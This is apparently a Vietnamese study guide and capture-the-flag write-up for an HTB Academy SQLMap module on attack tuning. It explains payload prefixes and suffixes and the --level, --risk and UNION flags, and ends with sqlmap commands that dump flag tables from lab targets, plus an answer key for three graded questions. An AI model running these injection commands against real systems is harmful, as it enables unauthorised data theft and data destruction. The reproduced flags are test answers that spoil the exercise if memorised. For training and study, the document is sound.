# Tinh Chỉnh Tham Số Tấn Công (Attack Tuning)

> **HTB Academy Module 58: SQLMap Essentials - Section 6 / 11**  
> *Đường dẫn bài học: `02-building-attacks/03-attack-tuning.md`*

---

## 1. Cấu Trúc Của Một Payload Trong SQLMap

Trong phần lớn các tình huống, SQLMap có thể tự động phát hiện và khai thác điểm tiêm với cấu hình mặc định. Tuy nhiên, khi gặp các câu lệnh SQL phức tạp hoặc được bao bọc bởi các ký tự đặc biệt, pentester cần chủ động tinh chỉnh (**Attack Tuning**) để hỗ trợ SQLMap vượt qua giai đoạn nhận diện (Detection Phase).

Mọi payload gửi đến mục tiêu đều được cấu thành từ hai thành phần chính:
$$\text{Payload} = \text{Boundaries (Prefix)} + \text{Vector} + \text{Boundaries (Suffix)}$$

1. **Vector (Lõi thực thi)**:
   * Là phần trung tâm của payload mang câu lệnh SQL hữu ích cần thực thi trên máy chủ mục tiêu.
   * *Ví dụ*: `UNION ALL SELECT 1, 2, @@version` hoặc `AND 1=IF(2>1,SLEEP(5),0)`.
2. **Boundaries (Tiền tố & Hậu tố - Prefix & Suffix)**:
   * Là các ký tự đóng/mở câu lệnh (ví dụ: `')`, `"))`, `'`, `%')`) và ký tự chú thích (ví dụ: `-- -`, `#`, `/*`).
   * Mục đích: Giúp "vá" câu lệnh SQL gốc của backend để phần Vector được nhúng vào một cách hợp lệ mà không gây lỗi cú pháp.

---

## 2. Tiền Tố & Hậu Tố Tùy Biến (`--prefix` & `--suffix`)

Trong một số trường hợp hiếm gặp, câu truy vấn backend được lập trình viên viết theo cấu trúc lạ mà bộ payload mặc định của SQLMap không khớp được.

### Ví Dụ Thực Tế:
Giả sử mã nguồn PHP của backend như sau:
```php
$query = "SELECT id, name, surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```
Trong trường hợp này, giá trị của `$_GET["q"]` bị bao bọc bởi:
* Tiền tố bên trái: `(('`
* Hậu tố bên phải: `')) LIMIT 0,1`

Để tiêm thành công vector `UNION ALL SELECT 1,2,VERSION()`, ta cần chỉ định:
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

Khi đó, câu lệnh SQL hoàn chỉnh được gửi tới backend sẽ trở nên hoàn toàn hợp lệ:
```sql
SELECT id, name, surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

---

## 3. Mức Độ Thử Nghiệm (`--level`) và Mức Độ Rủi Ro (`--risk`)

Mặc định, SQLMap chỉ sử dụng một tập hợp nhỏ các boundaries và vectors phổ biến nhất (với `--level=1` và `--risk=1`, chỉ tốn tối đa khoảng **72 requests** cho mỗi tham số). Tuy nhiên, ta có thể mở rộng phạm vi thử nghiệm:

### 3.1. Cờ `--level` (Thang điểm từ 1 đến 5 - Mặc định: 1)
* Mở rộng số lượng vectors và boundaries dựa trên xác suất thành công (mức càng cao thì thử nghiệm các trường hợp càng hiếm gặp).
* **Vị trí kiểm tra**:
  * `Level 1`: Kiểm tra tham số GET và POST.
  * `Level 2`: Bổ sung kiểm tra **HTTP Cookie Header**.
  * `Level 3`: Bổ sung kiểm tra **HTTP User-Agent** và **Referer Headers**.
  * `Level 4 & 5`: Thử nghiệm toàn bộ boundaries phức tạp nhất, nâng tổng số payload lên tới **7.865 payloads**.

### 3.2. Cờ `--risk` (Thang điểm từ 1 đến 3 - Mặc định: 1)
* Mở rộng các vector dựa trên mức độ rủi ro gây gián đoạn dịch vụ hoặc làm thay đổi/mất mát dữ liệu của mục tiêu:
  * `Risk 1`: Hoàn toàn vô hại (chỉ dùng các phép thử an toàn).
  * `Risk 2`: Thêm các payload dựa trên toán tử truy vấn tốn tài nguyên hoặc các phép thử truy vấn nặng.
  * `Risk 3`: **Bổ sung các payload chứa toán tử `OR`** (ví dụ: `OR 1=1`).
    > ⚠️ **Tại sao toán tử `OR` lại có Risk = 3?**  
    > Nếu câu lệnh bị tiêm không phải là `SELECT` mà là `UPDATE users SET status=0 WHERE id=...` hoặc `DELETE FROM orders WHERE id=...`, việc tiêm `OR 1=1` sẽ vô tình cập nhật hoặc **XÓA SẠCH TOÀN BỘ BẢNG DỮ LIỆU CỦA DATABASE!** Do đó SQLMap mặc định không bao giờ thử payload `OR` trừ khi bạn chỉ định rõ `--risk=3`.

---

## 4. Các Tham Số Tinh Chỉnh Nâng Cao Khác (Advanced Tuning)

| Tham Số (Flag) | Mục Đích Sử Dụng Thực Chiến |
| :--- | :--- |
| **`--code=200`** | Chỉ định trang TRUE phải trả về đúng mã HTTP 200 (và FALSE trả về mã khác như 500/404). |
| **`--titles`** | Ép SQLMap chỉ so sánh nội dung bên trong thẻ `<title>` của trang HTML để phân biệt TRUE/FALSE. |
| **`--string="success"`** | Chỉ định chuỗi hằng số xuất hiện khi TRUE và biến mất khi FALSE (loại bỏ hoàn toàn false-positive). |
| **`--text-only`** | Loại bỏ toàn bộ các thẻ HTML rác (`<script>`, `<style>`), chỉ so sánh phần văn bản hiển thị. |
| **`--technique=BEU`** | Chỉ thử các kỹ thuật Boolean (`B`), Error (`E`), UNION (`U`), bỏ qua Time-based (`T`) và Stacked (`S`). |
| **`--union-cols=5`** | Ép SQLMap dùng chính xác số cột của câu query UNION (ví dụ: 5 cột) thay vì phải tự dò tìm. |
| **`--union-char='a'`** | Thay đổi ký tự lấp đầy dummy value trong `UNION SELECT` thành ký tự cụ thể thay vì dùng `NULL`. |
| **`--union-from=users`** | Bổ sung mệnh đề `FROM <table>` vào cuối câu UNION query (bắt buộc đối với Oracle DB). |

---

## 5. Hướng Dẫn Giải Chi Tiết Các Bài Lab Tương Tác (HTB Cases 5, 6, 7)

Sau khi nhấn **Spawn the target system**, bạn sẽ nhận được địa chỉ IP và Port của máy lab: `http://<TARGET_IP>:<PORT>/`.

---

### 🎯 Case #5 (Question 1): Tấn Công Tham Số Đòi Hỏi Nâng Mức Rủi Ro (`--risk=3`)
* **Đề bài**: Khai thác và trích xuất nội dung bảng `flag5`.
* **Phân tích mục tiêu**: Trang `case5.php` yêu cầu payload dạng Boolean logic nguy hiểm (`OR`), nếu quét với `--risk 1` thông thường thì SQLMap sẽ hoàn toàn bỏ qua và không nhận diện được điểm tiêm.
* **Lệnh khai thác**:
  ```bash
  sqlmap -u "http://<TARGET_IP>:<PORT>/case5.php?id=1" --level=5 --risk=3 -D testdb -T flag5 --dump --batch --no-cast
  ```
* **Kết quả trích xuất**:
  ```text
  Database: testdb
  Table: flag5
  [1 entry]
  +----+----------------------------------+
  | id | flag                             |
  +----+----------------------------------+
  | 1  | HTB{700_much_r15k_bu7_w0r7h_17}  |
  +----+----------------------------------+
  ```
* 👉 **Flag 5**: `HTB{700_much_r15k_bu7_w0r7h_17}`

---

### 🎯 Case #6 (Question 2): Tấn Công Mệnh Đề Bị Đóng Ngoặc Đơn & Backtick (`--prefix`)
* **Đề bài**: Khai thác và trích xuất nội dung bảng `flag6`.
* **Phân tích mục tiêu**: Trang `case6.php?col=id` nhận tham số sắp xếp tên cột, được bao bọc bên trong dấu backtick và ngoặc đơn: ``(`col`)``. Để phá vỡ cấu trúc này, ta cần thêm tiền tố `--prefix="')"` hoặc ``--prefix='`)'``.
* **Lệnh khai thác**:
  ```bash
  sqlmap -u "http://<TARGET_IP>:<PORT>/case6.php?col=id" --level=5 --risk=3 --prefix='`)' -D testdb -T flag6 --dump --batch --no-cast
  ```
* **Kết quả trích xuất**:
  ```text
  Database: testdb
  Table: flag6
  [1 entry]
  +----+----------------------------------+
  | id | flag                             |
  +----+----------------------------------+
  | 1  | HTB{v1nc3_mcm4h0n_15_4570n15h3d} |
  +----+----------------------------------+
  ```
* 👉 **Flag 6**: `HTB{v1nc3_mcm4h0n_15_4570n15h3d}`

---

### 🎯 Case #7 (Question 3): Tinh Chỉnh Câu Lệnh UNION (`--union-cols=5`)
* **Đề bài**: Khai thác và trích xuất nội dung bảng `flag7`.
* **Phân tích mục tiêu**: Trang `case7.php` dính lỗi UNION-based SQLi nhưng SQLMap không thể tự động nhận biết số cột bằng phương pháp ORDER BY thông thường do cấu trúc trả về bị giới hạn. Ta cần ép SQLMap sử dụng chính xác **5 cột** bằng tham số `--union-cols=5`.
* **Lệnh khai thác**:
  ```bash
  sqlmap -u "http://<TARGET_IP>:<PORT>/case7.php?id=1" --union-cols=5 -D testdb -T flag7 --dump --batch --level=5 --risk=3 --no-cast
  ```
* **Kết quả trích xuất**:
  ```text
  Database: testdb
  Table: flag7
  [1 entry]
  +----+----------------------+
  | id | flag                 |
  +----+----------------------+
  | 1  | HTB{un173_7h3_un173d}|
  +----+----------------------+
  ```
* 👉 **Flag 7**: `HTB{un173_7h3_un173d}`

---

## 6. Bảng Tổng Hợp Đáp Án Checkpoint (Official Solutions Matrix)

| STT | Câu Hỏi (HTB Academy) | Kỹ Thuật Tinh Chỉnh Sử Dụng | Đáp Án Điền Hệ Thống |
| :---: | :--- | :--- | :---: |
| **Q1** | *What's the contents of table flag5? (Case #5)* | Nâng mức rủi ro kiểm tra payload OR (`--level=5 --risk=3`) | **`HTB{700_much_r15k_bu7_w0r7h_17}`** |
| **Q2** | *What's the contents of table flag6? (Case #6)* | Định nghĩa tiền tố đóng ngoặc backtick (`--prefix='`)'`) | **`HTB{v1nc3_mcm4h0n_15_4570n15h3d}`** |
| **Q3** | *What's the contents of table flag7? (Case #7)* | Chỉ định chính xác số cột UNION query (`--union-cols=5`) | **`HTB{un173_7h3_un173d}`** |

---
*Edit by me and AI.*
